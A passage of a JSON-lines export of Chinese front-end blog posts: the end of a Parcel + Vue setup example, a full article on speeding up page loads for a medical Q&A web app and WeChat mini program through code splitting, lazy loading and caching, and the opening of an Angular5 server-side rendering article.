class=\"hljs-name\"\u003ehead\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003emeta\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003echarset\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"UTF-8\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003etitle\u003c/span\u003e\u0026gt;\u003c/span\u003eParcel Vue\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003etitle\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ehead\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ebody\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"app\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh1\u003c/span\u003e\u0026gt;\u003c/span\u003eHello Parcel\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh1\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"app.js\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"undefined\"\u003e\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ebody\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ehtml\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后写一些 vue 的代码。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eapp.js\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e Vue \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'vue/dist/vue.js'\u003c/span\u003e;\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e app = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Vue({\n  \u003cspan class=\"hljs-attr\"\u003eel\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'#app'\u003c/span\u003e,\n  \u003cspan class=\"hljs-attr\"\u003etemplate\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e`\u0026lt;h1\u0026gt;{{ name }}\u0026lt;/h1\u0026gt;`\u003c/span\u003e,\n  data() {\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e {\n      \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'hfpp2012'\u003c/span\u003e\n    }\n  }\n})\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e最后，运行 \u003ccode\u003eparcel index.html\u003c/code\u003e，结果如下：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/20/16074195e68cbdc9?w=1121\u0026amp;h=492\u0026amp;f=png\u0026amp;s=80815\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e可能有更好的方法，欢迎大家评论留言。\u003c/p\u003e\n","buildTime":"1514964532.5828","__v":0}
{"_id":{"$oid":"5a4cc1fa37991328ecbc7462"},"id":"5a4cabd76fb9a0452406399f","author":{"$oid":"5a4b76d92239bd131cd79f35"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2018/1/3/160bb8098bd03895?w=344\u0026h=344\u0026f=jpeg\u0026s=69995","https://user-gold-cdn.xitu.io/2018/1/3/160bb8139bc95137?w=597\u0026h=28\u0026f=png\u0026s=9914","https://user-gold-cdn.xitu.io/2018/1/3/160bb81819ef1428?w=589\u0026h=26\u0026f=png\u0026s=9856","https://user-gold-cdn.xitu.io/2018/1/3/160bb81ab540df5a?w=594\u0026h=26\u0026f=png\u0026s=9359","https://user-gold-cdn.xitu.io/2018/1/3/160bb81e17fd2046?w=588\u0026h=26\u0026f=png\u0026s=9717","https://user-gold-cdn.xitu.io/2018/1/3/160bb8245cc2d8d5?w=1207\u0026h=764\u0026f=png\u0026s=51058","https://user-gold-cdn.xitu.io/2018/1/3/160bb82d8b8dbe98?w=706\u0026h=276\u0026f=png\u0026s=35422","https://user-gold-cdn.xitu.io/2018/1/3/160bb82a266aa745?w=726\u0026h=184\u0026f=png\u0026s=39824","https://user-gold-cdn.xitu.io/2018/1/3/160bb8395147dc7b?w=1732\u0026h=896\u0026f=png\u0026s=269244","https://user-gold-cdn.xitu.io/2018/1/3/160bb83f113a7627?w=1142\u0026h=856\u0026f=png\u0026s=279047","https://user-gold-cdn.xitu.io/2018/1/3/160bb8453dd1f1ee?w=375\u0026h=221\u0026f=png\u0026s=23606","https://user-gold-cdn.xitu.io/2018/1/3/160bb84f6b6c0511?w=505\u0026h=1060\u0026f=png\u0026s=326543","https://user-gold-cdn.xitu.io/2018/1/3/160bb8547de2aee0?w=866\u0026h=1052\u0026f=png\u0026s=254551"],"screenShot":null}],"title":"初级前端项目加载速度优化","meta":{"likeCount":0},"tag":["微信小程序"],"comment":[],"shortContent":"这份文字是根据近期团队做 来问丁香医生 SPA 和 丁香医生小程序 加载速度优化的经历整理而成。 古人有一句话叫做：治感冒看疗效。既然是关于速度优化的，我们就先来看一下优化的效果。 选取了访问量较大的首页和我的页面进行随机取样，通过下图可以看到首页的加载时间从 5.1s 下降到…","content":"\u003cp\u003e这份文字是根据近期团队做 \u003ca target=\"_blank\" href=\"https://ask.dxy.com/ama/index\"\u003e来问丁香医生 SPA\u003c/a\u003e 和 丁香医生小程序 加载速度优化的经历整理而成。\u003c/p\u003e\n\u003cp\u003e微信扫一扫，体验丁香医生小程序：\n\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bb8098bd03895?w=344\u0026amp;h=344\u0026amp;f=jpeg\u0026amp;s=69995\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch1 class=\"heading\"\u003e效果\u003c/h1\u003e\n\u003cp\u003e古人有一句话叫做：治感冒看疗效。既然是关于速度优化的，我们就先来看一下优化的效果。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"https://ask.dxy.com/ama/index\"\u003e来问丁香医生 \u003c/a\u003e\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003eChrome Network\u003c/h3\u003e\n\u003cp\u003e选取了访问量较大的首页和我的页面进行随机取样，通过下图可以看到首页的加载时间从 5.1s 下降到 1.67s，我的页面从 2.92s 下降到 1.82s。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e优化前\u003c/h4\u003e\n\u003cp\u003e首页\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bb8139bc95137?w=597\u0026amp;h=28\u0026amp;f=png\u0026amp;s=9914\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e我的页面\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bb81819ef1428?w=589\u0026amp;h=26\u0026amp;f=png\u0026amp;s=9856\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e优化后\u003c/h4\u003e\n\u003cp\u003e首页\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bb81ab540df5a?w=594\u0026amp;h=26\u0026amp;f=png\u0026amp;s=9359\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e我的页面\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bb81e17fd2046?w=588\u0026amp;h=26\u0026amp;f=png\u0026amp;s=9717\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"http://mta.qq.com/\"\u003emta\u003c/a\u003e\u003c/h3\u003e\n\u003cp\u003e2018.01.02 早上的页面响应速度数据，目前国内各省份平均加载速度在 0.99~2s（虽然没有达到 1s 内加载，但是以目前业务量级，这样的速度是可以被接受的）：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bb8245cc2d8d5?w=1207\u0026amp;h=764\u0026amp;f=png\u0026amp;s=51058\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"https://developers.google.com/speed/pagespeed/insights/\"\u003eGoogle PageSpeed Insights\u003c/a\u003e 和 \u003ca target=\"_blank\" href=\"https://chrome.google.com/webstore/search/pagespeed%20insights?utm_source=chrome-ntp-icon\"\u003epagespeed insights Chrome 插件\u003c/a\u003e\u003c/h3\u003e\n\u003cp\u003e前者这是 Google 的一个评分工具，最开始做优化时用它测了一些页面的分数。后来发现了后面这些 Chrome 插件。让我困惑的是同样的页面这几个工具给出的结果分数都不一样。\u003ca target=\"_blank\" href=\"https://www.taobao.com/\"\u003e手淘\u003c/a\u003e 的首屏加载速度挺快的，但是跑出来的分数也不高。最终我只是选择性的参考一下工具给出来的建议，忽视了其给出的评分。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e丁香医生小程序\u003c/h2\u003e\n\u003cp\u003e对于小程序，做了优化后得到部门同学的反馈是这样的：\n\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bb82d8b8dbe98?w=706\u0026amp;h=276\u0026amp;f=png\u0026amp;s=35422\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bb82a266aa745?w=726\u0026amp;h=184\u0026amp;f=png\u0026amp;s=39824\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e具体的数据指标如何呢？虽然目前没有特别好用的性能检测方式（包括官方提供的性能检测工具在内），最终我们组的舒哲同学还是利用官方提供的工具做了一下简单的数据对比，数据如下：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bb8395147dc7b?w=1732\u0026amp;h=896\u0026amp;f=png\u0026amp;s=269244\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e在不影响产品需求正常迭代的前提下，两个项目的优化断断续续持续了两周。整体上来说，本次优化的性价比还是较高的。\u003c/p\u003e\n\u003chr\u003e\n\u003ch1 class=\"heading\"\u003e为什么做加载速度优化？\u003c/h1\u003e\n\u003cp\u003e直接原因很简单：慢。虽然说页面加载速度并没有达到慢的让人无法忍受，但至少没办法让人说加载很快。\u003c/p\u003e\n\u003cp\u003e既然明知道加载速度不快，那之前在干什么？为什么不早早的去做优化呢？\u003c/p\u003e\n\u003cp\u003e这是一个好问题，我曾经在深夜中问过自己多次。我给自己的答案是：首先，要承认自身技术水平和经验的限制，如果是一个在前端战场上身经百战的人一直在负责项目的迭代，或许情况会比优化前好一些。 其次，之前整个产品线的项目一直处于探索和快速迭代中，前端研发资源基本上总是处在被需求排满的状态下，产品需求快速上线的优先级是最高的。正是因为产品的整体节奏稍微放缓了一些，才让研发资源有精力来做一些优化。\u003c/p\u003e\n\u003chr\u003e\n\u003ch1 class=\"heading\"\u003e为什么说是前端响应速度优化，而不是前后端？\u003c/h1\u003e\n\u003cp\u003e因为我是亲眼看着这两个项目逐渐长大的，单从前端工程的角度来审视，在自己的认知范围内，早就认为项目中有一些地方是需要优化的。坚定了先从前端动手的想法，是因为读了\u003ca target=\"_blank\" href=\"https://book.douban.com/subject/3132277/\"\u003e《高性能网站建设指南》\u003c/a\u003e这本书，书中提到了一个性能黄金法则（Performance Golden Rule）：只有 10% ~ 20% 的最终用户响应时间是花在下载 HTML 文档上。话说到这个份上，还犹豫什么呢，先从前端项目开始撸起袖子加油干吧。\u003c/p\u003e\n\u003cp\u003e之前去 Qcon 等技术大会上，听过几次关于加载速度的分享。比如：使用 HTTP2，整站级别的前后端优化等。方案确实是好的方案，但具体是否要应用到自己团队实际项目中，还得根据执行成本、团队技术储备等维度从长计议。\u003c/p\u003e\n\u003chr\u003e\n\u003ch1 class=\"heading\"\u003e为什么说是初级？\u003c/h1\u003e\n\u003cp\u003e因为深感自己在前端性能优化这个领域还有很长的路要走。\u003c/p\u003e\n\u003chr\u003e\n\u003ch1 class=\"heading\"\u003e如何做的？\u003c/h1\u003e\n\u003cp\u003e前戏这么长，终于可以开始了。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e来问丁香医生 SPA\u003c/h2\u003e\n\u003cp\u003e先看图（绿色部分为已在项目中应用的方法）：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bb83f113a7627?w=1142\u0026amp;h=856\u0026amp;f=png\u0026amp;s=279047\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e实现游客机制\u003c/h3\u003e\n\u003cp\u003e最初来问丁香医生是基于微信服务号做的，当时的设计是用户通过服务号菜单进入应用时，会自动帮他进行跳转登录，登录成功后服务端再重定向回到应用。登录这个环节，虽然与项目代码层面的加载优化关系不大，但是从用户体验的角度这样的流程是不好的。因为相比于直接打开页面，用户需要等更长的时间，并且会看到两次页面加载的进度条。从产品的角度，一些页面是不需要用户登录即可访问的。综上，将登录流程后置，让用户可以直接进入应用这件事情，于情于理都是必须要做的。\u003c/p\u003e\n\u003cp\u003e改造流程大致为：梳理产品现有流程 -\u0026gt; 用户进入应用时取消强制登录 -\u0026gt; 在产品流程核心环节进行用户登录状态判断并引导登录。具体实现细节不再赘述。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e减小资源包体积\u003c/h3\u003e\n\u003cp\u003e实现了游客机制后，接下来就是对应用的资源包动手了。因为通过 Chrome 开发者工具的 Network 可以看出，下载 CSS、JS 资源还是占用了不少时间的。下图是减小资源包体积之前的情况：\u003c/p\u003e\n\u003cp\u003e优化前包体积大小-Gzipped\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bb8453dd1f1ee?w=375\u0026amp;h=221\u0026amp;f=png\u0026amp;s=23606\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e精简第三方依赖\u003c/h4\u003e\n\u003cp\u003e想要减少资源体积大小，首先需要知道哪些资源时应该/可以被删除的。由于项目是基于 Webpack 构建的，因此可以使用\u003ca target=\"_blank\" href=\"https://github.com/webpack-contrib/webpack-bundle-analyzer\"\u003eWebpack Bundle Analyzer\u003c/a\u003e进行分析Webpack 生成的包体组成。然后根据实际情况进行移除就好。\u003c/p\u003e\n\u003cp\u003e精简了第三方依赖后，启动应用时需要下载的资源体积还是挺大的。此时就需要使用 Webpack 的代码分离和懒加载进行进一步的优化。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"https://doc.webpack-china.org/guides/code-splitting/\"\u003e代码分离\u003c/a\u003e\u003c/h4\u003e\n\u003cp\u003e代码分离的思想就是化整为零，将代码分离到不同的 bundle 中，然后可以按需加载或并行加载这些小的 bundle 文件。\u003c/p\u003e\n\u003cp\u003e代码分离主要是利用 Webpack 的动态导入\u003c/p\u003e\n\u003cp\u003eWebpack 目前有三种常用的代码分离方法：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e入口起点：使用 entry 配置手动地分离代码。（优势：简单、直观。劣势：配置繁琐、同一份代码可能会被引入到各个 bundle 中、不灵活，并不能将核心应用程序逻辑进行动态拆分代码）\u003c/li\u003e\n\u003cli\u003e防止重复：使用 CommonsChunkPlugin 去重和分离 chunk。\u003c/li\u003e\n\u003cli\u003e动态导入：通过模块的内联函数调用来分离代码。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e经过对比之后，最终选择了动态导入的方式。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e动态导入(dynamic imports)\u003c/h4\u003e\n\u003cp\u003ewebpack 提供了两个类似的技术：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eimport() 语法（推荐，符合 ECMAScript 提案）\u003c/li\u003e\n\u003cli\u003erequire.ensure（webpack 钦定）\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 class=\"heading\"\u003e示例\u003c/h4\u003e\n\u003cpre\u003e\u003ccode class=\"hljs JavaScript\" lang=\"JavaScript\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 分离 lodash\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003egetComponent\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e _ = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e(\u003cspan class=\"hljs-comment\"\u003e/* webpackChunkName: \"lodash\" */\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'lodash'\u003c/span\u003e);\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"https://doc.webpack-china.org/guides/lazy-loading/\"\u003e懒加载\u003c/a\u003e\u003c/h4\u003e\n\u003cp\u003e懒加载是在代码分离的基础上更近了一步。\u003c/p\u003e\n\u003cp\u003e虽然我们可以将代码进行代码分离，但代码分离后的 bundle 只是加载的优先级会不同，最终还是会加载，但实际情况是某些代码在用户进行某项操作之前是不需要加载的。比如：个人信息编辑页面有一个用户修改头像功能，对于用户来说，即使他进入了个人信息编辑页面，在他未点击上传按钮之前，用于上传头像的代码是没必要加载的。\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://router.vuejs.org/zh-cn/\"\u003eVue-Router\u003c/a\u003e 结合 Vue 的\u003ca target=\"_blank\" href=\"https://cn.vuejs.org/v2/guide/components.html#%E5%BC%82%E6%AD%A5%E7%BB%84%E4%BB%B6\"\u003e异步组件\u003c/a\u003e和 Webpack 的\u003ca target=\"_blank\" href=\"(https://doc.webpack-china.org/guides/code-splitting/)\"\u003e代码分割\u003c/a\u003e功能，实现了\u003ca target=\"_blank\" href=\"https://router.vuejs.org/zh-cn/advanced/lazy-loading.html\"\u003e路由组件的懒加载\u003c/a\u003e。\u003c/p\u003e\n\u003cp\u003e在经过精简依赖、代码分离和懒加载之后，项目的资源包体积大小如下图：\u003c/p\u003e\n\u003cp\u003eGzipped：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bb84f6b6c0511?w=505\u0026amp;h=1060\u0026amp;f=png\u0026amp;s=326543\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e用户进入首页需要加载的 js 资源从 \u003ccode\u003evendor.js\u003c/code\u003e、\u003ccode\u003emain.js\u003c/code\u003e 和 \u003ccode\u003echunks\u003c/code\u003e 共 672.84kb 变为只需要加载一个 186kb 的 \u003ccode\u003emain.js\u003c/code\u003e。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e复用 Store 数据以减少网络请求数量\u003c/h4\u003e\n\u003cp\u003e来问丁香医生是基于 \u003ca target=\"_blank\" href=\"https://cn.vuejs.org/v2/guide/\"\u003eVue.js\u003c/a\u003e 全家桶实现的，状态管理用的是 \u003ca target=\"_blank\" href=\"https://vuex.vuejs.org/zh-cn/getting-started.html\"\u003eVuex\u003c/a\u003e。\u003c/p\u003e\n\u003cp\u003e之前的实现中，有些功能实现没有很在意 \u003ccode\u003eStore\u003c/code\u003e 数据的复用。比如：从 A 页面进入 B 页面后再返回 A 页面时，会再去获取端获取一次 A 页面需要的数据。这种处理不仅仅是多发了不必要的请求，如果在请求过程中做了一些页面级别加载中的处理，那么每次切换页面时都会让用户看到 loading 效果，这也会让人觉得加载慢。既然用了状态管理，那么就应该把他利用好才是。\u003c/p\u003e\n\u003cp\u003e本次优化过程中的数据复用，主要是在部分请求 \u003ccode\u003eaction\u003c/code\u003e 之前增加逻辑判断，如果 \u003ccode\u003eStore\u003c/code\u003e 中有当前操作需要的数据，则不再调用 \u003ccode\u003eaction\u003c/code\u003e。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e前后端彻底分离\u003c/h3\u003e\n\u003cp\u003e关于这一点会再写一篇文章进行阐述。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e丁香医生小程序\u003c/h2\u003e\n\u003cp\u003e老规矩，先看图：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bb8547de2aee0?w=866\u0026amp;h=1052\u0026amp;f=png\u0026amp;s=254551\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e图片资源\u003c/h3\u003e\n\u003cp\u003e最开始做小程序时，是把所有图片资源 base64 后进行使用的，这导致了所有图片资源最终都被打包到小程序的安装包中。所以做小程序的加载速度优化的第一步，就是把一些体积较大的图片资源改为使用线上资源。具体做法是将素材先上传到 cdn，然后在小程序中直接使用线上图片地址。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e登录鉴权优化\u003c/h3\u003e\n\u003cp\u003e原本小程序的登录是我们自己实现的一套登录方案，核心是前后端一起维护一个类似于 \u003ccode\u003eSessionId\u003c/code\u003e 的 ID。服务端对于这个 ID 是设置了有效期的，而之前前端的实现是每次用户启动小程序，都直接去请求公司的 SSO 获取一个新的 ID，没有在意本地的 ID 是否过期。\u003c/p\u003e\n\u003cp\u003e优化的点在于在应用启动时，增加对 ID 有效期的判断，从而避免每次用户启动都需要发请求获取新的 ID。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e预渲染\u003c/h3\u003e\n\u003cp\u003e之前在小程序所有需要从服务端获取数据的页面，都实现了一个加载中的效果，即请求未返回结果时，整个页面用户只会看到一个加载中的菊花。如果某页面只有服务端提供的元数据级别接口，没有业务接口，并且接口返回的数据是有依赖关系的，那么用户等待的时间会大大加长。\u003c/p\u003e\n\u003cp\u003e仔细思考会发现，其实是没有必要等所有接口数据回来后再给用户呈现完整页面的。\u003c/p\u003e\n\u003cp\u003e最终的优化方案分为两种：一种是取消加载中效果，先给用户呈现完整的利用本地数据渲染好的页面，等接口返回数据后在进行页面视图的更新；另外一种方案是取消加载中效果，但是不做本地数据渲染，而是直接给用户看到部分静态页面。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"https://mp.weixin.qq.com/debug/wxadoc/dev/framework/subpackages.html\"\u003e分包加载\u003c/a\u003e\u003c/h3\u003e\n\u003cp\u003e关于分包加载，就老老实实的按照官方文档做就好了。进行分包后的效果还是很不错的。具体效果可以参考文章开头的数据统计。\u003c/p\u003e\n\u003cp\u003e目前上述方案中，效果比较明显的是预渲染和分包加载。一个是视觉上让用户觉得快了，一个是真真切切的把首次加载的资源包变小了。\u003c/p\u003e\n\u003chr\u003e\n\u003ch1 class=\"heading\"\u003e总结\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e软件的性能，在编写第一行代码开始，到软件的生命周期结束，都应该给予足够的重视（在做项目写代码的过程中能规避可能出现的性能问题，是需要一定的技术功底的，在实现的时候也不一定非得强求性能，慢慢修炼就好）。\u003c/li\u003e\n\u003cli\u003e在涉及到项目架构层面的改动时，一定一定要做足够的回归测试（经历过的热都应该知道为什么会这么说）。\u003c/li\u003e\n\u003cli\u003e要学会用数据说话。\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch1 class=\"heading\"\u003e结束了吗？\u003c/h1\u003e\n\u003cp\u003eNo！前端性能优化这条路，路漫漫其修远兮。\u003c/p\u003e\n\u003cp\u003e本文作者：丁香园前端工程师 @志遥\u003c/p\u003e\n","buildTime":"1514979785.8205","__v":0}
{"_id":{"$oid":"5a4cc1fa37991328ecbc745a"},"id":"5a4ca77b6fb9a0451e40330c","author":{"$oid":"5a4cc1f937991328ecbc7441"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2018/1/3/160bb6e359aa8ac8?w=1920\u0026h=540\u0026f=jpeg\u0026s=15340","https://user-gold-cdn.xitu.io/2018/1/3/160bb6e35b7a3218?w=1388\u0026h=622\u0026f=png\u0026s=-1","https://user-gold-cdn.xitu.io/2018/1/3/160bb6e359907fd7?w=1384\u0026h=1192\u0026f=png\u0026s=-1","https://user-gold-cdn.xitu.io/2018/1/3/160bb6e359c89bea?w=1428\u0026h=766\u0026f=png\u0026s=-1","https://user-gold-cdn.xitu.io/2018/1/3/160bb6e3598620ef?w=1323\u0026h=746\u0026f=png\u0026s=-1"],"screenShot":null}],"title":"Angular5 服务端渲染实战","meta":{"likeCount":0},"tag":["Angular.js","前端","JavaScript","命令行"],"comment":[],"shortContent":"本文基于上一篇 Angular5 的文章继续进行开发，上文中讲了搭建 Angular5 有道翻译的过程，以及遇到问题的解决方案。 随后改了 UI，从 bootstrap4 改到 angular material，这里不详细讲，服务端渲染也与修改 UI 无关。 看过之前文章的人会…","content":"\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bb6e359aa8ac8?w=1920\u0026amp;h=540\u0026amp;f=jpeg\u0026amp;s=15340\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e本文基于上一篇 Angular5 的文章继续进行开发，上文中讲了搭建 Angular5 有道翻译的过程，以及遇到问题的解决方案。\u003c/p\u003e\n\u003cp\u003e随后改了 UI，从 bootstrap4 改到 angular material，这里不详细讲，服务端渲染也与修改 UI 无关。\u003c/p\u003e\n\u003cp\u003e看过之前文章的人会发现，文章内容都偏向于服务端渲染，vue 的 nuxt，react 的 next。\u003c/p\u003e\n\u003cp\u003e在本次改版前也尝试去找类似 nuxt.js 与 next.js 的顶级封装库，可以大大节省时间，但是未果。\u003c/p\u003e\n\u003cp\u003e最后决定使用从 Angular2 开始就可用的前后端同构解决方案 \u003ca target=\"_blank\" href=\"https://github.com/angular/universal\"\u003eAngular Universal\u003c/a\u003e（Universal (isomorphic) JavaScript support for Angular.）\u003c/p\u003e\n\u003cp\u003e在这里不详细介绍文档内容，本文也尽量使用通俗易懂的语言带入 Angular 的 SSR\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e前提\u003c/h2\u003e\n\u003cp\u003e前面写的 udao 这个项目是完全遵从于 angular-cli 的，从搭建到打包，这也使得本文通用于所有 angular-cli 搭建的 angular5 项目。\u003c/p\u003e\n\u003ch2 